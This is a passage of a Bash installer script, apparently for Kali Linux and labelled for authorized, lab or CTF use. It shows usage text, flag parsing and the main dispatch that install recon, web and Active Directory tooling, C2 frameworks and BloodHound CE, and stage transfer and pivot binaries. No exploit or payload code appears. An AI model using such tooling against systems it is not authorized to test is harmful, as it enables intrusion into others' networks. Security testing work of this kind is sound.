${C_BOLD}${SCRIPT_NAME} v4${C_RST} — offensive / red-team installer + transfer staging (Kali)
${C_DIM}Authorized / lab / CTF use only.${C_RST}

Usage: ${SCRIPT_NAME} [targets | --profile <name>] [options]

Engagement profiles:
  --profile recon   External recon (apt + pipx + go)
  --profile web     Web app testing (+ git, Linux transfer binaries)
  --profile ad      Internal AD (+ rust, C2, BloodHound CE, all transfer binaries)
  --profile full    Everything (= --all)

Targets (individual flags):
  --all         everything (no metapackage)
  --core        apt + pipx + go + rust + git (no C2)
  --c2          C2 frameworks + --bhce
  --bhce        BloodHound CE docker-compose
  --rust        Rust toolchain + rusthound-ce
  --transfer    ~/tools/{linux,windows,pivot} transfer binaries
  --apt --pipx --go --rust --git --linux --windows --pivot --metapackage

Options:
  --configure     post-install: msfdb init, nuclei templates, rockyou, docker group
  --update        refresh/redownload things that already exist
  --dry-run       show what would happen, change nothing
  --list          print the full catalog and exit
  --check-urls    resolve + probe every release asset (no install)
  --health        verify installed tools and staged transfer binaries

Examples:
  ${SCRIPT_NAME} --profile ad --configure    # full AD engagement
  ${SCRIPT_NAME} --profile recon --dry-run   # preview recon tools
  ${SCRIPT_NAME} --go --update               # refresh Go tools
  ${SCRIPT_NAME} --check-urls                # pre-flight URL check

Env:  GITHUB_TOKEN=<token>   avoids GitHub API rate limits
Locations:  ${OPT_DIR}  (box tools)    ${TRANSFER_DIR}  (transfer binaries)
EOF
}

# =============================================================== arg parse ======
DO_APT=0; DO_PIPX=0; DO_GO=0; DO_RUST=0; DO_GIT=0; DO_C2=0; DO_BHCE=0
DO_LINUX=0; DO_WIN=0; DO_PIVOT=0; DO_META=0; DO_CONFIGURE=0
ACTION="run"
[[ $# -eq 0 ]] && { usage; exit 0; }
while [[ $# -gt 0 ]]; do
    case "$1" in
        --all)        DO_APT=1; DO_PIPX=1; DO_GO=1; DO_RUST=1; DO_GIT=1; DO_C2=1; DO_BHCE=1; DO_LINUX=1; DO_WIN=1; DO_PIVOT=1 ;;
        --core)       DO_APT=1; DO_PIPX=1; DO_GO=1; DO_RUST=1; DO_GIT=1 ;;
        --c2)         DO_C2=1; DO_BHCE=1 ;;
        --bhce)       DO_BHCE=1 ;;
        --rust)       DO_RUST=1 ;;
        --transfer)   DO_LINUX=1; DO_WIN=1; DO_PIVOT=1 ;;
        --apt)        DO_APT=1 ;;
        --pipx)       DO_PIPX=1 ;;
        --go)         DO_GO=1 ;;
        --git)        DO_GIT=1 ;;
        --linux)      DO_LINUX=1 ;;
        --windows)    DO_WIN=1 ;;
        --pivot)      DO_PIVOT=1 ;;
        --metapackage) DO_META=1 ;;
        --configure)  DO_CONFIGURE=1 ;;
        --profile)
            shift; [[ -z "${1:-}" ]] && { err "--profile requires a name (recon|web|ad|full)"; exit 2; }
            apply_profile "$1" ;;
        --update|--force) FORCE=1 ;;
        --dry-run)    DRY_RUN=1 ;;
        --list)       ACTION="list" ;;
        --check-urls) ACTION="checkurls" ;;
        --health)     ACTION="health" ;;
        -h|--help)    usage; exit 0 ;;
        *) err "Unknown argument: $1"; echo; usage; exit 2 ;;
    esac
    shift
done

# ================================================================== main ========
if [[ "${DRY_RUN}" -ne 1 && "${ACTION}" == "run" ]]; then
    if ${SUDO} mkdir -p "${LOG_DIR}" 2>/dev/null && ${SUDO} chown "${REAL_USER}":"${REAL_USER}" "${LOG_DIR}" 2>/dev/null; then
        LOG_FILE="${LOG_DIR}/$(date '+%Y%m%d-%H%M%S').log"
    else
        mkdir -p "${TRANSFER_DIR}" 2>/dev/null; LOG_FILE="${TRANSFER_DIR}/kali-arsenal.log"
    fi
fi

printf '%s%s v4%s  %s(authorized / lab / CTF use only)%s\n' "${C_BOLD}" "${SCRIPT_NAME}" "${C_RST}" "${C_DIM}" "${C_RST}"
info "user=${REAL_USER}  home=${REAL_HOME}"

case "${ACTION}" in
    list)   do_list;   exit 0 ;;
    checkurls) check_urls; exit 0 ;;
    health) do_health; exit 0 ;;
esac

if ! have curl; then
    warn "curl missing — installing"
    [[ "${DRY_RUN}" -eq 1 ]] || { ${SUDO} apt-get update -qq && ${SUDO} apt-get install -y -qq curl; }
fi

setup_dirs
[[ ${DO_META}      -eq 1 ]] && install_metapackage
[[ ${DO_APT}       -eq 1 ]] && install_apt
[[ ${DO_PIPX}      -eq 1 ]] && install_pipx
[[ ${DO_GO}        -eq 1 ]] && install_go
[[ ${DO_RUST}      -eq 1 ]] && install_rust
[[ ${DO_GIT}       -eq 1 ]] && install_git
[[ ${DO_GIT}       -eq 1 ]] && install_release_bins
[[ ${DO_C2}        -eq 1 ]] && install_c2
[[ ${DO_BHCE}      -eq 1 ]] && install_bloodhound_ce
[[ ${DO_CONFIGURE} -eq 1 ]] && install_configure
if [[ ${DO_LINUX} -eq 1 || ${DO_WIN} -eq 1 || ${DO_PIVOT} -eq 1 ]]; then stage_transfer; fi

summary
exit 0
